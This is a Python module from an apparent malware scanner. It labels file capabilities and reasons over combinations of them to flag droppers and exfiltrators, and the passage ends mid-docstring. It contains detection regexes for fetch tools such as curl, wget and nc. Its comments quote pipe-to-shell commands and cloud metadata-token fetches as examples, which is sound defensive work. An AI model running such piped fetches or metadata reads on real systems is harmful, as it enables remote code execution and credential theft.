"""Capability detection and composite reasoning.

This is where the language-agnostic detection model becomes real.

The detector does two distinct jobs, and separating them is the whole design.

**Labelling.** It runs the capability rules over a file's bytes and records what
that file can do: decode, execute, spawn, read credentials, reach the network,
persist. On their own these are observations, not accusations. Every one has
legitimate uses, and reporting them individually would drown a user in noise.

**Reasoning.** It then evaluates composite rules over those labels. A file that
decodes a string *and* executes it is a second-stage loader. A file that reads
credentials *and* reaches the network *and* spawns a process is an exfiltrator.
Neither conclusion is available from any single pattern, which is why signature
matching alone plateaus so quickly.

The reason this generalises across languages is that the primitives are forced
by the attacker's objective rather than chosen by them. To exfiltrate data, code
must read something sensitive and send it somewhere. To run a second stage, it
must decode a payload and execute it. Those constraints hold in every language,
so a new language supplies pattern data for six names and inherits the entire
composite rule set unchanged.
"""

from __future__ import annotations

import re
from collections import Counter
from contextlib import suppress
from dataclasses import dataclass, replace
from pathlib import PurePosixPath
from typing import TYPE_CHECKING, ClassVar

from cordon_scanner.core.comments import block_comment_spans, inside_spans
from cordon_scanner.core.models import (
    Capability,
    Category,
    Evidence,
    Explanation,
    Finding,
    Location,
    MatchKind,
    Severity,
)
from cordon_scanner.core.redact import Redactor
from cordon_scanner.core.samples import is_machine_provisioning, names_authentication
from cordon_scanner.core.scoring import RiskScorer, ScoringContext
from cordon_scanner.detect import embedded
from cordon_scanner.detect.base import (
    BaseDetector,
    DetectorRequirements,
    FileUnit,
    RuleSelector,
    ScanContext,
)
from cordon_scanner.detect.pyast import loop_delay_lines
from cordon_scanner.detect.secrets import (
    FIXTURE_CEILING,
    RULE_MATERIAL_CEILING,
    documentation_spans,
    is_build_tooling,
    is_documentation,
    is_generated_artefact,
    is_test_material,
    is_vendored,
    test_module_spans,
)

if TYPE_CHECKING:
    from collections.abc import Iterable

    from cordon_scanner.core.content import FileContent
    from cordon_scanner.detect.base import Unit
    from cordon_scanner.detect.embedded import Command
    from cordon_scanner.rules.loader import CompiledRule


MAX_VARIANTS = 8
"""Distinct operations counted per rule before the count stops mattering.

Depth beyond a handful changes no conclusion, and the cap is what keeps a
generated file with a thousand matches from being scanned in full."""

MAX_MATCHES_EXAMINED = 64
"""Occurrences examined per rule while counting distinct operations."""


EGRESS_TARGET = re.compile(
    rb"""(?ix)
    (?:https?|ftp|ws|wss)://          # a destination, written out
    (?:[^\s/@"'`\\]{1,120}@)?        # credentials in the URL, which are not the host
    \[?([A-Za-z0-9._:\-]{1,253})\]?   # the host, bracketed when it is an IPv6 literal
    """,
)
"""A written-out destination in a fetch. Only URLs: a variable cannot be judged."""

SCHEMELESS_TARGET = re.compile(
    rb"""(?ix)
    \b(?:curl|wget)[ \t]{1,8}
    (?:-{1,2}[A-Za-z][A-Za-z0-9-]{0,20}(?:[ \t]{1,8}[^\s-][^\s]{0,40})?[ \t]{1,8}){0,6}
    (                                   # and it has to LOOK like a host:
        (?: localhost
          | [A-Za-z0-9][A-Za-z0-9.-]{0,60}\.[A-Za-z]{2,24}   # a dotted name
          | [0-9]{1,3}(?:\.[0-9]{1,3}){3}                    # an IPv4 literal
        )
        (?::[0-9]{1,5})?
    )
    (?=[/ \t"']|$)
    # Without that the capture took the next token whatever it was, so
    # `curl -X POST localhost:8000/x` yielded `POST` as a second "host", nothing was
    # unanimously local, and the suppression silently stopped applying to exactly the
    # lines it was written for.
    """,
)
"""A fetch whose destination is written without a scheme.

`curl localhost:8000/v1/models` is how a CI script waits for the server it just
started, and vLLM writes it inside a `timeout 600 bash -c "until curl ...; do sleep
1; done"` loop. With only the URL pattern above, no host was found, nothing was
judged local, and the health check counted as reaching the network -- which with
`bash -c` on another line and `.buildkite/` for context produced
`MALWARE.DROPPER.001` at CRITICAL, fifteen times in one repository, about a script
that pulls the project's own image and runs its own test suite in it."""

QUOTED_TARGET = re.compile(
    rb"""(?ix)
    ["'`]
    (?: localhost
      | [0-9]{1,3}(?:\.[0-9]{1,3}){3}
      | ::1
      | [A-Za-z0-9][A-Za-z0-9.-]{0,60}\.[A-Za-z]{2,24}
    )
    (?::[0-9]{1,5})?
    ["'`]
    """,
)
"""A host written as a bare quoted string, with no scheme and no fetch tool in front.

`SCHEMELESS_TARGET` above only reads a `curl` or `wget` line. Every language that opens
a socket directly writes the host on its own: `pnpm` has
`TcpStream::connect(("127.0.0.1", port))` in its benchmark harness, and Go, Python and
Rust all spell it that way.

Adding a source of hosts can only make suppression harder, never easier: `_is_local_target`
requires EVERY host on the line to be local, so a line that quotes a real destination
keeps its capability because of this rather than in spite of it."""

LOCAL_EGRESS_TARGET = re.compile(
    rb"""(?ix)
    ^(?:
        localhost
      | 127\.[0-9.]{1,11}
      | 0\.0\.0\.0
      | ::1
      | 169\.254\.[0-9]{1,3}\.[0-9]{1,3}      # link-local, which every metadata service is
      | metadata\.google\.internal
      | [a-z0-9-]{1,60}\.localhost
    )(?::[0-9]{1,5})?$
    """,
)
"""Destinations that are not the network leaving the machine.

Loopback, and -- the one that prompted this -- the 169.254.0.0/16 link-local
range, which is where every cloud provider puts its instance metadata service.

Deliberately NOT the documentation names. `LOCAL_OR_RESERVED_HOST` in the secret
detector treats `example.com` and the RFC 6761 `.test` family as addresses nobody
authenticates to, which is right for a credential and wrong here: a fetch is a
fetch whatever it resolves to, this project's own malicious corpus is written
against `.test` hosts precisely because they resolve to nothing, and exempting
them would have turned every one of those samples into a false negative. A fetch
written against a documentation host in documentation is already ceilinged by
where it sits.

`stacksimplify/terraform-on-aws-eks` supplied fifteen copies of a fourteen-line
cloud-init script that installs Apache and writes the EC2 instance identity
document into the webroot:

    TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "..."`
    sudo curl -H "X-aws-ec2-metadata-token: $TOKEN" \
        http://169.254.169.254/latest/dynamic/instance-identity/document -o ...

Cordon read that as an outbound connection and produced both
`SUSPECT.PERSIST.001` -- "reaches the network and writes to a location that
survives a restart", the write being `systemctl enable httpd` -- and
`SUSPECT.EXFIL.001`. Neither claim was true: nothing left the instance.

The trade, stated: a payload that reaches a proxy on loopback, or reads metadata
credentials and posts them to 127.0.0.1 for something else to forward, loses this
capability here. That is accepted because the alternative is a capability whose
definition -- "opens an outbound network connection" -- is false for every file
that talks to its own metadata endpoint, and reading IMDS is how a very large
amount of ordinary cloud tooling finds out where it is running. A fetch that does
leave the host is still a fetch: the suppression is per match, so one local curl
beside one remote curl leaves the remote one intact.
"""


def cls_in(line: int, spans: frozenset[tuple[int, int]]) -> bool:
    """Whether a line falls inside any of these ranges."""
    return any(first <= line <= last for first, last in spans)


@dataclass(frozen=True, slots=True)
class CapabilityHit:
    """One capability observed in a file, with where it was seen."""

    capability: Capability
    rule_id: str
    byte_start: int
    byte_end: int
    line: int
    fixed: bool = False
    """Whether this is a spawn whose entire argv was written out in the source.

    Set only by the Python AST tier, which is the only tier that can answer it.
    See `_evaluate_over`, which is the one place it is read."""

    variants: int = 1
    """How many distinct operations of this capability the rule matched.

    A decode rule covering base64, hex and decompression matches all three
    with one pattern, so the number of rules that fired cannot express how many
    decoding steps a file performs. This can: one call site repeated ten times
    is still one operation, and base64 followed by decompression is two."""

    resolved: bool = False
    """Whether this hit came from parsing the source rather than scanning it.

    A parsed hit is a SECOND VIEW of a call the byte tier usually saw too --
    `base64.b64decode(blob)` is one decoding step whether one tier reports it or
    three do. So these are excluded from the depth counts in `_evaluate_over`,
    or every parsed Python file would appear to decode twice and satisfy rules
    that ask for a chain of encodings.

    This used to be inferred from the rule id beginning `AST.`, which held only
    while the single internal tier was the only thing producing such hits.
    Adding `kind: ast` to the rule vocabulary broke that silently: rules named
    `CAP.PY.AST.*` are the same second view, do not begin with `AST.`, and so
    were counted -- which turned one `base64.b64decode` into a two-step decode
    chain and fired `SUSPECT.DECODE_CHAIN.001` on a file that decodes once.
    Carried explicitly now, because the property is about where a hit came from
    and never was about how it was named."""


class CapabilityDetector(BaseDetector):
    """Labels files with capabilities and evaluates composite rules over them."""

    id = "capability"
    # 0.2.0: a spawn whose whole argv is written out no longer satisfies a composite,
    # a capability named in a comment is not a capability, a link-local destination is
    # not egress, and a provisioning script's persistence is ceilinged. The bump is
    # what invalidates a cached result: `ScanCache.detector_signature` is `id@version`
    # and nothing else notices that a detector's behaviour changed.
    # 0.10.0: a presence test on one environment name is not whole-environment
    # access, and a primitive that is called is recorded once rather than twice.
    # 0.11.0: where the pattern tier and the AST tier label the same call differently,
    # the pattern tier wins -- one call is not two of a composite's capabilities.
    # 0.12.0: an encoded command's plaintext reaches the rules, and the
    # minified ceiling no longer excuses a language nobody minifies.
    version = "0.12.0"
    categories = frozenset(
        {Category.SUSPICIOUS, Category.MALICIOUS, Category.POLICY, Category.OPERATIONAL}
    )
    requires = DetectorRequirements(content=True)

    def applicable(self, ctx: ScanContext) -> bool:
        """Runs whenever any capability or composite rule is loaded."""
        return any(
            r.rule.capability is not None or r.match.kind is MatchKind.COMPOSITE for r in ctx.rules
        )

    def inspect(self, unit: Unit, ctx: ScanContext) -> Iterable[Finding]:
        if not isinstance(unit, FileUnit):
            return ()

        content = unit.content

        # Binary files are excluded from content rules. A byte sequence in a PNG
        # that happens to spell a pattern is a false positive with no upside,
        # and the file was never source to begin with.
        if content.is_binary:
            return ()

        candidates = RuleSelector.select_rules(ctx.rules, language=unit.language, path=content.path)
        if not candidates:
            return ()

        hits = self._match_capabilities(content, candidates, unit.language)
        resolved, commands = self._resolved_capabilities(unit, content)
        if not commands and unit.language != "python":
            commands = embedded.extract(content.text, unit.language)
        # And the plaintext of any encoded command among them, so the shell rules
        # see what `powershell -EncodedCommand` was given rather than only that it
        # was given something. See `embedded.decode_encoded_commands`: this is the
        # seam that made 109 of 171 missed malicious packages invisible.
        commands = embedded.decode_encoded_commands(commands)
        # And the plaintext of an encoded command the script runs at its own top
        # level, which is handed to no call and so reaches neither branch above.
        if unit.language in embedded.SCRIPT_LANGUAGES:
            commands.extend(embedded.encoded_commands_in(content.text))
        hits.extend(resolved)
        hits.extend(self._ast_rule_capabilities(content, candidates, unit.language))
        hits.extend(self._embedded_capabilities(ctx, content, commands))
        hits.extend(self._destination_capabilities(content, unit.language))
        findings: list[Finding] = list(self._composite_findings(unit, ctx, hits, candidates))

        # A truncated file was only partly examined, so say so. Claiming a clean
        # result for content that was never read is the failure this project
        # treats as unacceptable.
        if content.truncated:
            findings.append(
                self.operational(
                    path=content.path,
                    message=(
                        f"Only the first {len(content.raw)} bytes of this "
                        f"{content.size}-byte file were examined."
                    ),
                    detail="max_file_bytes",
                    rule_id="OPERATIONAL.FILE.TRUNCATED",
                )
            )

        return findings

    # -- Labelling -------------------------------------------------------

    TOOL_PROBE = re.compile(
        rb"""(?ix)
        (?:
            # Asking whether the tool exists.
            (?:
                \b(?:which|type|hash|whence|where)[ \t]{1,4}
              | \bcommand[ \t]{1,4}-v[ \t]{1,4}
              | \bcompgen[ \t]{1,4}-c[ \t]{1,4}
            )
            (?:-{1,2}[A-Za-z-]{1,12}[ \t]{1,4}){0,2}
          | # Or naming it as a package to install, where it is a noun rather than a verb:
            # `apt-get install -y wget curl` is how a script ACQUIRES curl.
            \b(?:apt|apt-get|aptitude|yum|dnf|microdnf|zypper|apk|brew|pacman|choco)\b
            [^\n]{0,40}?\b(?:install|add|-S)\b[ \t]{1,4}
            (?:[-\w.=]{1,40}[ \t]{1,4}){0,8}
        )
        $
        """,
    )
    """Asking whether a tool exists, which is not using it.

    vLLM's `run-benchmarks.sh` opens with
    `(which wget && which curl) || (apt-get update && apt-get install -y wget curl)`,
    and the egress primitive matched the word `curl`. With `bash -c` on another line
    that was `MALWARE.DROPPER.001` at CRITICAL, and pm2's `setup.deb.sh` does the same
    thing with `if command -v curl > /dev/null`.

    Anchored at the end, so it is the text immediately before the match that decides:
    `which curl` is a probe and `curl https://x/y` one line later is still a fetch."""

    FETCH_COMMAND = re.compile(rb"(?i)\b(?:curl|wget|nc|scp|rsync|Invoke-WebRequest)\b")
    """The commands an egress pattern is looking for, so their position can be found.

    The shell egress patterns are anchored at the start of the line, with a
    comment-excluding prefix before the command name, which means the MATCH begins at
    the line start and says nothing about what sits
    immediately before the command. Rather than rewrite six patterns in the pack and
    lose their own comment guard, the commands are located again here."""

    DECLARATION = re.compile(
        rb"""(?ix)
        (?:
            \b(?:function|def|fn|sub|proc|method|interface|declare|class|impl)
            [ \t]{1,8}(?:\*[ \t]{0,4})?
            # `use` brings a name into scope and calls nothing. `zeroclaw` writes
            # `use reqwest::Client;`, `pnpm` writes `use reqwest::Url;`, and both were
            # reported as opening an outbound connection -- three findings across two
            # repositories whose whole content was an import line.
          | \buse[ \t]{1,8}
            # And whatever path sits between `use` and the name. The match is often the
            # LAST segment -- `use std::process::Command;` -- where everything before it
            # is the path rather than whitespace after the keyword.
            (?:[A-Za-z_][A-Za-z0-9_]{0,40}(?:::|\.)){0,8}
          | \b(?:async|export|public|private|protected|static|abstract|override)
            [ \t]{1,8}(?:function[ \t]{1,8})?
        )
        $
        """,
    )
    """The keywords that make what follows a definition rather than a call.

    `google/zx` exports a function called `fetch`, and the egress pattern matched it:
    `export function fetch(` was that repository's only blocking finding. Defining a
    name is not using the thing it is named after."""

    SIGNATURE_ARGUMENT = re.compile(
        rb"""(?x)
        \([ \t]{0,8}
        (?:
            [A-Za-z_$][\w$]{0,40}[ \t]{0,4}\?{0,1}[ \t]{0,4}:[ \t]{0,4}[A-Za-z_$\[(]
          | \)[ \t]{0,4}:[ \t]{0,4}[A-Za-z_$]
        )
        """,
    )
    """A typed parameter list, which only a declaration has.

    Tailwind's integration helpers declare
    `exec(command: string, options?: ChildProcessOptions): Promise<string>` on an
    interface. A call passes values; `name: Type` in the parentheses is a signature, and
    so is an empty list followed by a return type."""

    OPEN_PAREN_ONLY = re.compile(rb"^\([ \t]*(?://.*)?$")
    """An opening parenthesis that ends its line, so the parameters are below it."""

    CONTINUED_PARAMETER = re.compile(
        rb"""(?x)
        ^[ \t]{0,40}
        (?:(?:readonly|public|private|protected)[ \t]{1,8}){0,2}
        [A-Za-z_$][\w$]{0,40}[ \t]{0,4}\?{0,1}[ \t]{0,4}:[ \t]{0,4}[A-Za-z_$\[({]
        """,
    )
    """`name: Type` opening a line: a parameter in a signature laid out one to a line."""

    SIGNATURE_LOOKAHEAD = 3
    """How many lines below an open parenthesis to look for a typed parameter.

    Three. A signature that has not named a typed parameter within three lines of
    its parenthesis is not being recognised from its first line either."""

    @staticmethod
    def _is_declaration(content: FileContent, offset: int, end: int) -> bool:
        """Whether this match is a name being DEFINED rather than called."""
        line_number = content.line_of(offset)
        line = content.line_text(line_number).encode("utf-8", errors="replace")
        column = content.column_of(offset) - 1
        if CapabilityDetector.DECLARATION.search(line[:column]) is not None:
            return True
        # From the match's LAST byte, which for these patterns is the opening
        # parenthesis -- `exec(` -- and the signature test needs to see it.
        tail = line[content.column_of(max(offset, end - 1)) - 1 :]
        if CapabilityDetector.SIGNATURE_ARGUMENT.match(tail) is not None:
            return True

        # A signature laid out one parameter to a line. The test above reads the
        # rest of THIS line, so a declaration whose parentheses open at the end of
        # it was invisible:
        #
        #     fetch(
        #         url: string,
        #         secretKey: string,
        #
        # That is `microsoft/vscode`, in the Copilot extension's
        # `ICompletionsFetchService` interface. `fetch(` was read as a network call
        # and `secretKey` as key material, and together they reported private key
        # material sent to the network at CRITICAL -- against a method signature,
        # twice, in the most widely installed editor there is.
        #
        # The defect is general rather than new: `exec(` opening a multi-line
        # signature was never suppressed either.
        if CapabilityDetector.OPEN_PAREN_ONLY.match(tail.strip()) is None:
            return False
        last = len(content.line_starts)
        stop = min(line_number + 1 + CapabilityDetector.SIGNATURE_LOOKAHEAD, last + 1)
        for ahead in range(line_number + 1, stop):
            nxt = content.line_text(ahead).encode("utf-8", errors="replace").strip()
            if not nxt:
                continue
            return CapabilityDetector.CONTINUED_PARAMETER.match(nxt) is not None
        return False

    @staticmethod
    def _is_tool_probe(content: FileContent, offset: int) -> bool:
        """Whether every fetch command on this line is the argument of an existence test.

        `(which wget && which curl) || (apt-get install -y wget curl)` is the first line
        of vLLM's benchmark script, and pm2's installer writes
        `if command -v curl > /dev/null`. Asking whether a tool exists is not using it.

        EVERY occurrence has to be a probe, so `which curl && curl https://x/y | sh` --
        a probe and then the real thing on one line -- is not excused.
        """
        line = content.line_text(content.line_of(offset)).encode("utf-8", errors="replace")
        commands = list(CapabilityDetector.FETCH_COMMAND.finditer(line))
        if not commands:
            return False
        return all(
            CapabilityDetector.TOOL_PROBE.search(line[: command.start()]) is not None
            for command in commands
        )

    @staticmethod
    def _is_local_target(content: FileContent, offset: int) -> bool:
        """Whether every destination written beside this fetch stays on the machine.

        Judged from the line the match sits on, and from a written-out URL only: a
        fetch of `"$URL"` says nothing about where it goes, and a line naming no host
        at all is left alone. Suppression requires EVERY host on the line to be local,
        so a command that reads metadata and pipes it somewhere real keeps its
        capability.
        """
        line = content.line_text(content.line_of(offset)).encode("utf-8", errors="replace")
        hosts = (
            EGRESS_TARGET.findall(line)
            + SCHEMELESS_TARGET.findall(line)
            # And hosts written as a bare quoted string. See `QUOTED_TARGET`.
            + [found.strip(b"\"'`") for found in QUOTED_TARGET.findall(line)]
        )
        # Trimmed, because a URL is often assembled out of shell quoting:
        # `"http://127.0.0.1:'"$port"'/health"` leaves the capture as `127.0.0.1:` with
        # the port on the other side of a quote, and an incomplete port is not a reason
        # to call a loopback address remote. vLLM writes that line in every integration
        # script it has.
        # From the RIGHT only. `::1` is a loopback address whose leading colons are the
        # address, and stripping both ends turned it into `1`, which the suite caught.
        trimmed = [host.rstrip(b":.'\"") for host in hosts]
        return bool(trimmed) and all(LOCAL_EGRESS_TARGET.match(host) for host in trimmed)

    def _match_capabilities(
        self,
        content: FileContent,
        candidates: tuple[CompiledRule, ...],
        language: str | None = None,
    ) -> list[CapabilityHit]:
        """Run capability rules over the file's bytes.

        Matching happens against ``bytes``, never decoded text. Most files match
        nothing, and decoding them all would be the single largest waste in the
        scan. It also means attacker-controlled bytes are only decoded once
        something has already indicated it is worth doing.
        """
        raw = content.raw
        hits: list[CapabilityHit] = []
        # Once per file, not once per match: the per-line comment test cannot see a
        # `/* ... */` whose continuation lines are indented prose rather than starting
        # with `*`. See `core.comments.block_comment_spans`.
        blocks = block_comment_spans(content.text, language)
        # And the Rust test modules, for the same reason and on the same schedule. A
        # `#[cfg(test)]` block is live code, so none of the comment tests above sees it,
        # and it is where a Rust crate's sample credentials and sample hosts live.
        # `Hmbown/Codewhale` builds a fleet-host fixture in one, with an SSH identity
        # path and a chat webhook in the same module, and the pair was reported as
        # credential access beside a drop point.
        #
        # Only for Rust. Every other language keeps its tests in a separate file, which
        # the path globs already answer.
        tests = test_module_spans(content.text) if language == "rust" else ()
        # And Python's docstrings, which are prose in a string and so invisible to every
        # comment test above. `NousResearch/hermes-agent` opens
        # `gateway/shutdown_forensics.py` with a summary of what it collects -- "/proc
        # summaries, systemd parentage, takeover markers, TracerPid, 1-min load" -- and
        # `TracerPid` in that sentence was reported as code checking whether it is being
        # traced. The file is named for reading those things; the docstring says so.
        #
        # The secrets detector has parsed these since it measured them. The same parse,
        # the same cache-once-per-file schedule.
        prose = documentation_spans(content.text) if language == "python" else ()
        # And the lines where a sleep sits inside a loop, which is a heartbeat rather
        # than a delay before a payload. `CAP.ANTI.DELAY.001` records in its own comment
        # that this belongs in the Python tier and not in a pattern; see
        # `pyast.loop_delay_lines`.
        delays = loop_delay_lines(content.text) if language == "python" else frozenset()

        for compiled in candidates:
            capability = compiled.rule.capability
            if capability is None or compiled.match.regex is None:
                continue

            # The prefilter is what makes this affordable. A cheap substring scan
            # rejects the large majority of files before any regex runs, turning
            # cost proportional to files times rules into something a commit-time
            # hook can pay.
            prefilter = compiled.match.prefilter
            if prefilter and not any(literal in raw for literal in prefilter):
                continue

            first = None
            distinct: set[bytes] = set()

            for index, match in enumerate(compiled.match.regex.finditer(raw)):
                if CapabilityDetector._is_printed_text(content, match.start(), match.end()):
                    continue
                if capability is Capability.FETCH_EXEC and CapabilityDetector._is_quoted_pipeline(
                    content, match.start(), match.end()
                ):
                    # A `|` inside quotes is not a pipeline. See `_is_quoted_pipeline`.
                    continue
                if capability is Capability.SPAWN and CapabilityDetector._is_literal_backtick(
                    content, match.start()
                ):
                    # A backtick inside single quotes is a character, not a substitution.
                    # See `_is_literal_backtick`.
                    continue
                if CapabilityDetector._is_declaration(content, match.start(), match.end()):
                    # `export function fetch(` defines a name; it does not call one. See
                    # `DECLARATION` and `SIGNATURE_ARGUMENT`.
                    continue
                if CapabilityDetector._is_example_line(content, match.start()):
                    # A doctest or a shell transcript. See `EXAMPLE_PROMPT`.
                    continue
                if inside_spans(tests, match.start()):
                    # A Rust test module. See `tests` above.
                    continue
                if inside_spans(prose, match.start()):
                    # A Python docstring. See `prose` above.
                    continue
                if (
                    capability is Capability.ANTI_ANALYSIS
                    and delays
                    and content.line_of(match.start()) in delays
                ):
                    # A sleep inside a loop. See `delays` above.
                    continue
                if inside_spans(blocks, match.start()) or CapabilityDetector._is_comment(
                    content, match.start(), language
                ):
                    # A comment does not run. `misc/error_handler.func` in
                    # `community-scripts/ProxmoxVE` explains in a comment that
                    # `systemd-detect-virt` reports lxc inside a container, and that
                    # sentence was reported as a check for being observed.
                    continue
                if capability is Capability.EGRESS and (
                    CapabilityDetector._is_local_target(content, match.start())
                    or CapabilityDetector._is_tool_probe(content, match.start())
                ):
                    continue
                if first is None:
                    first = match
                # Distinct *operations*, not distinct occurrences. Ten calls to
                # the same decoder are one decoding step repeated; base64 and
                # then decompression are two, and that difference is what
                # separates an ordinary decode from a chain built to survive
                # each layer of inspection.
                distinct.add(b" ".join(match.group(0).split()))
                if len(distinct) >= MAX_VARIANTS or index >= MAX_MATCHES_EXAMINED:
                    break

            if first is None:
                continue

            # One hit per rule per file. Reporting every occurrence would
            # inflate the evidence without changing any conclusion; the count
            # of distinct operations rides along on the hit instead.
            hits.append(
                CapabilityHit(
                    capability=capability,
                    rule_id=compiled.id,
                    byte_start=first.start(),
                    byte_end=first.end(),
                    line=content.line_of(first.start()),
                    variants=len(distinct),
                )
            )

        return hits

    #: A line this long means the file was generated, whatever it is called.
    #:
    #: The path globs catch `*.min.js`, `dist/` and `.yarn/releases/`, and they cannot
    #: catch a bundler that names its output with a content hash:
    #: `assets/ToolsPage-COpoWLDm.js` and `assets/index-BTLZFAP9.js` are Vite output and
    #: match no convention a glob can express. A minified bundle contains a decoder
    #: beside an evaluator because that is what a module loader is, so it supplies
    #: `SUSPECT.DECODE_CHAIN.001` and `SUSPECT.DECODE_EXEC.001` by construction.
    #:
    #: Content rather than name is also the harder signal to dodge, which is why the
    #: threshold is generous: a thousand characters on one line is not something
    #: anybody writes by hand, and hand-written code that does is already reported by
    #: `SUSPECT.OBFUSCATION.LONGLINE.001` on its own merits.
    MINIFIED_LINE = 1000

    BUNDLED_SUFFIXES = frozenset(
        {".js", ".mjs", ".cjs", ".jsx", ".ts", ".tsx", ".css", ".scss", ".less", ".map"}
    )
    """Extensions where a thousand characters on one line means a bundler ran.

    The ceiling above exists for one reason, stated in `MINIFIED_LINE`: a minified
    bundle contains a decoder beside an evaluator because that is what a module
    loader is. That is a fact about **bundlers**, and bundlers are a JavaScript and
    CSS practice. Nothing in the Python, Ruby, shell, Go or Rust toolchains emits a
    thousand-character line, so in those languages the same measurement means the
    opposite thing -- somebody obfuscated the file by hand.

    Measured, and it is how this was found. `bettercolor` is a real malicious PyPI
    package whose payload is a pyobfuscate blob in a library module: a 12KB `.py`
    file with a 6,307-character line. It matched `_is_minified`, so the ceiling took
    `SUSPECT.DECODE_CHAIN.001` from critical to medium and a CI gate would have
    passed it. Eleven of 201 sampled malicious packages were held below the gate,
    most of them this way.

    A noise ceiling that fires on obfuscated malware is worse than no ceiling: it
    turns a finding a reader would act on into one they will not see."""

    MINIFIED_MEAN_LINE = 200
    """Mean bytes per line before a file is build output rather than source.

    The third half of this test, added after the other two were not enough. A
    minifier's whole purpose is to delete newlines, so its output is one line,
    or three, and the mean line length is most of the file. Hand-written source
    averages nearer forty bytes a line however long its longest line is.

    Without this, one long line anywhere in a `.js` file made the whole file
    "minified output". `budi-kue16-riris` is a registry-spam worm -- generate a
    name, rewrite `package.json`, `exec('npm publish')`, repeat -- and it opens
    with two long array literals of Indonesian names and foods to generate the
    names from. Those two lines bought the entire file a ceiling, and
    `SUSPECT.REGISTRY.SELF_PUBLISH.001` came out at MEDIUM instead of HIGH.
    About thirty packages of that family are in the npm corpus and every one of
    them was under the gate for the same reason.

    The fifth time in this release a ceiling meant for noise was found holding
    malware below the line, and the second time for this particular ceiling."""

    @staticmethod
    def _is_minified(content: FileContent) -> bool:
        """Whether this file looks like build output regardless of its name.

        Long lines, an extension a bundler writes, AND long lines being what the
        file is mostly made of. See `BUNDLED_SUFFIXES` for why the second is not
        optional and `MINIFIED_MEAN_LINE` for why the third is not either.
        """
        if content.longest_line <= CapabilityDetector.MINIFIED_LINE:
            return False
        suffix = PurePosixPath(content.path).suffix.lower()
        if suffix not in CapabilityDetector.BUNDLED_SUFFIXES:
            return False
        lines = max(1, len(content.line_starts))
        return len(content.raw) / lines > CapabilityDetector.MINIFIED_MEAN_LINE

    @staticmethod
    def _satisfying_region(content: FileContent, hits: list[CapabilityHit]) -> bytes:
        """The bytes the composite actually matched across, plus a margin.

        A window around the ANCHOR is the wrong region to look in. The anchor is one
        of several hits and not necessarily the fetch: in Elasticsearch's
        `setup_node.sh` the anchor landed 400 bytes away from the `curl`, so the pin in
        the URL was outside the window and the file was still called malware.

        The composite matched because a SET of hits sat close enough together, so that
        set is the region any statement about the match has to be made over.
        """
        if not hits:
            return b""
        start = min(hit.byte_start for hit in hits)
        end = max(hit.byte_end for hit in hits)
        return content.raw[max(0, start - 200) : end + 200]

    #: A fetch whose target is identified by something immutable.
    #:
    #: A version in the path, a release asset under a tag, a commit digest, or a
    #: checksum verified nearby. Any of those means the bytes that arrive are the bytes
    #: somebody chose, so the fetch is reviewable even though it crosses the network.
    #:
    #: What this separates, and why it is worth a category rather than a severity: the
    #: Codecov bash uploader was `curl -s https://codecov.io/bash | bash` -- no version,
    #: nothing to verify, and whatever the host served that day is what ran. That is the
    #: attack `MALWARE.DROPPER.001` is named for. Elasticsearch's
    #: `.buildkite/scripts/setup_node.sh` runs
    #: `curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.4/install.sh | bash`,
    #: which is the same four shell tokens and a completely different proposition.
    #:
    #: Deliberately NOT "the host is well known". A popular host is not a control, and
    #: a list of trusted domains is a list somebody will add to.
    PINNED_FETCH = re.compile(
        rb"""(?ix)
        (?:
            /v?\d+\.\d+(?:\.\d+)?/          # a version as a path segment
          | /releases/download/[^/\s]+/       # a release asset under a tag
          | /archive/refs/tags/                # a tagged source archive
          | @[0-9a-f]{40}\b                   # a git commit pin
          | [?&](?:ref|sha|commit)=[0-9a-f]{7,40}\b
          | sha(?:1|256|512)sum[ \t]+(?:-c|--check)
          | gpg[^\n]{0,80}--verify
          | cosign[ \t]+verify
        )
        """,
        re.VERBOSE | re.IGNORECASE,
    )

    #: Statements whose quoted argument is shown to somebody, not run.
    #:
    #: Make's three diagnostic functions, and the printing commands of every shell
    #: and language that appears in a build file. A capability matched inside the
    #: string one of these is given is a capability the file TALKS ABOUT.
    DIAGNOSTIC_STATEMENT = re.compile(
        rb"""(?ix)
        ^[ \t]*
        (?:
            [@-]{0,2}[ \t]*
            (?:echo|printf|print|puts|say|warn|
               console\.(?:log|info|warn|error)|
               write-host|write-output|write-warning)
          | \$\((?:warning|info|error)\b
        )
        """,
        re.VERBOSE | re.IGNORECASE,
    )

    #: A line of a doctest or an interactive transcript.
    #:
    #: `>>>` and `...` are Python's doctest prompts, `$` and `#` a shell transcript,
    #: `In [n]:` IPython's. A capability named on one of those lines is an ILLUSTRATION
    #: of an API: `aiohttp`'s own docstrings open a session in a doctest, `diffusers`
    #: fetches an image with `requests.get` in one, and both were read as code.
    #:
    #: The secrets detector has asked this question since its second release and this
    #: one did not, which is the same asymmetry the comment test had.
    EXAMPLE_PROMPT = re.compile(rb"^[ \t]*(?:>>>|\.\.\.|\$[ \t]|#[ \t]|In[ \t]\[\d+\]:)")

    @staticmethod
    def _is_example_line(content: FileContent, offset: int) -> bool:
        """Whether this offset sits on a transcript line rather than on code."""
        line = content.line_text(content.line_of(offset))
        if not line:
            return False
        return CapabilityDetector.EXAMPLE_PROMPT.match(line.encode("utf-8", "replace")) is not None

    @staticmethod
    def _is_comment(content: FileContent, offset: int, language: str | None) -> bool:
        """Whether this capability was named in a comment. See `core.comments`.

        Through the memo on `FileContent`, because every match on one line asks
        the same question of that line and the answer is a scan of it.
        """
        start = content.comment_column(content.line_of(offset), language)
        return start is not None and content.column_of(offset) - 1 >= start

    @staticmethod
    def _is_printed_text(content: FileContent, start: int, end: int) -> bool:
        """Whether this match sits inside a string that is printed rather than run.

        The worst false positive found against real code, and the clearest. The
        Makefile in `spf13/cobra` - one of the most depended-upon Go libraries in
        existence - carries this:

            ifeq (, $(shell which golangci-lint))
            $(warning "could not find golangci-lint, run: curl -sfL https://... | sh")
            endif

        That is the text printed to a developer who is missing a tool. Cordon read
        the `curl ... | sh` inside it and reported MALWARE.DROPPER.001 at CRITICAL,
        in the MALICIOUS category, plus SUSPECT.DROPPER.001 on the same line. An
        accusation of that weight against a printed help message is not a tuning
        problem; it is the finding that ends the conversation about whether to adopt
        the tool.

        Install instructions embedded in diagnostics, READMEs and `echo` lines are
        everywhere, because `curl ... | sh` is how a great deal of software
        documents its own installation.

        TWO conditions, and the second is what keeps this from becoming a hole:

        The statement must be a printer, and the match must lie ENTIRELY inside its
        quoted argument. `echo "run: curl x | sh"` has the whole construct inside
